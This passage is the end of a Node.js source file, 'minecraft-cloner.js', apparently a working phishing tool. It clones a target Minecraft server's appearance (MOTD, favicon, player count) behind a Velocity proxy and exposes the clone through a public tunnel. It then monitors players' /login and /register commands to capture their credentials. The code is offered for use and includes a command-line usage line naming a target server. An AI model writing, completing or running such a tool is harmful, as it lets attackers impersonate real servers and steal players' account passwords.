            console.log('═══════════════════════════════════════════════════════════════');
            console.log('🔍 Automatic scanning of the target server');
            console.log('🔧 Automatic setup of Velocity + ViaBackwards');
            console.log('🌐 Automatic public tunnel');
            console.log('🗝️  Automatic credential capturing');
            console.log('═══════════════════════════════════════════════════════════════\n');

            // Check if Velocity is already installed
            const velocityExists = fs.existsSync(path.join(this.velocityDir, 'velocity.jar'));
            
            if (velocityExists) {
                console.log('🔄 EXISTING VELOCITY DETECTED - Quick reconfiguration');
                console.log('═══════════════════════════════════════════════════════════');
                console.log('🚀 Jump download (already present)');
                console.log('📝 Only configuration update');
                console.log('═══════════════════════════════════════════════════════════\n');

                // Use quick reconfiguration
                await this.reconfigureTarget(process.argv[2], parseInt(process.argv[3]) || 25565);
            } else {
                console.log('📦 FIRST INSTALLATION - Complete setup');
                console.log('═══════════════════════════════════════════════════════════\n');

                // Scan the target server
                await this.scanTarget(process.argv[2], parseInt(process.argv[3]) || 25565);
                
                // Complete Velocity Setup
                await this.setupVelocity();
            }
            
            // Launch Velocity
            await this.startVelocity();
            
            // Setup tunnel
            const tunnel = await this.setupTunnel();
            
            // Start credential monitoring
            await this.startCredentialMonitoring();
            
            console.log('⚠️  PRESS CTRL+C TO STOP EVERYTHING');
            console.log('🎯 Active monitoring for /login and /register commands...\n');
            
            // Wait for interruption
            process.on('SIGINT', () => {
                console.log('\n⏹️  Interruption requested...\n');
                this.credLogger.printStats();
                this.cleanup();
                process.exit(0);
            });
            
            // Keep the process alive
            while (this.isRunning) {
                await new Promise(resolve => setTimeout(resolve, 5000));
            }
            
        } catch (error) {
            console.error('❌ System error:', error.message);
            this.cleanup();
            process.exit(1);
        }
    }

    // Update only the target server in the existing configuration (without restart)
    updateTargetConfig(newHost, newPort, newTargetInfo) {
        const configPath = path.join(this.velocityDir, 'velocity.toml');
        
        if (!fs.existsSync(configPath)) return false;
        
        try {
            let config = fs.readFileSync(configPath, 'utf8');
            
            // Update target server
            config = config.replace(/lobby = ".*"/, `lobby = "${newHost}:${newPort}"`);
            
            // Update max players if available
            if (newTargetInfo?.players?.max) {
                config = config.replace(/show-max-players = \d+/, `show-max-players = ${newTargetInfo.players.max}`);
            }
            
            fs.writeFileSync(configPath, config);
            console.log(`✅ Server target: ${newHost}:${newPort}`);

            // Update favicon if available
            if (newTargetInfo?.favicon) {
                try {
                    const faviconPath = path.join(this.velocityDir, 'server-icon.png');
                    const faviconData = newTargetInfo.favicon.split(',')[1];
                    fs.writeFileSync(faviconPath, Buffer.from(faviconData, 'base64'));
                    console.log('✅ Favicon: Copied from the new server');
                } catch (error) {
                    console.log('⚠️  Favicon update error:', error.message);
                }
            }

            // The MOTD is automatically updated via ping-passthrough
            console.log('✅ MOTD: Automatically synchronized (ping-passthrough)');
            console.log('✅ Colors: Maintained 1:1 from the original server');

            return true;
            
        } catch (error) {
            console.log('⚠️  Configuration update error:', error.message);
            return false;
        }
    }

    cleanup() {
        console.log('🧹 Cleaning up processes...');


        // Kill entire process group for Velocity on Windows
        if (this.velocityProcess) {
            try {
                if (this.velocityProcess.pid && this.velocityProcess.pid > 0) {
                    if (treeKill) {
                        treeKill(this.velocityProcess.pid, 'SIGKILL', (err) => {
                            if (err && err.code !== 'ESRCH') {
                                console.log('⚠️  Error killing Velocity (tree-kill):', err.message);
                            } else {
                                console.log('🛑 Velocity stopped (tree-kill)');
                            }
                        });
                    } else {
                        // Fallback: kill solo il processo padre
                        this.velocityProcess.kill('SIGKILL');
                        console.log('🛑 Velocity stopped (fallback)');
                    }
                }
            } catch (e) {
                if (e.code !== 'ESRCH') {
                    console.log('⚠️  Error killing Velocity:', e.message);
                }
            }
        }

        if (this.tunnelProcess) {
            try {
                this.tunnelProcess.kill(killSignal);
                console.log('🛑 Tunnel stopped');
            } catch (e) {
                console.log('⚠️  Error killing Tunnel:', e.message);
            }
        }

        this.isRunning = false;
    }

    // Check if two servers are "compatible" for fast switching
    isCompatibleTarget(oldTarget, newTarget) {
        if (!oldTarget || !newTarget) return false;

        // Compatible if same version and same base features
        const sameVersion = oldTarget.version?.name === newTarget.version?.name;
        const sameProtocol = oldTarget.version?.protocol === newTarget.version?.protocol;
        
        if (sameVersion && sameProtocol) {
            console.log('⚡ Compatible target - fast switch possible');
            return true;
        }

        console.log('⚠️ Different target - reconfiguration needed');
        return false;
    }
}

// Automatic startup

if (require.main === module) {
    if (process.argv.length < 3) {
        console.log('❌ Usage: node minecraft-cloner.js <server> [port]');
        console.log('📝 Example: node minecraft-cloner.js myserver.net 25565');
        process.exit(1);
    }

    // Assign the cloner instance to globalThis for signal handling
    globalThis.clonerInstance = new AutoMinecraftCloner();
    globalThis.clonerInstance.run().catch(console.error);

    // Handle termination signals for proper cleanup
    const cleanupAndExit = (signal) => {
        if (globalThis.clonerInstance) {
            console.log(`\n⏹️  Received ${signal}, cleaning up...`);
            globalThis.clonerInstance.credLogger.printStats();
            globalThis.clonerInstance.cleanup();
        }
        process.exit(0);
    };
    process.on('SIGTERM', () => cleanupAndExit('SIGTERM'));
    process.on('SIGINT', () => cleanupAndExit('SIGINT'));
}

module.exports = AutoMinecraftCloner;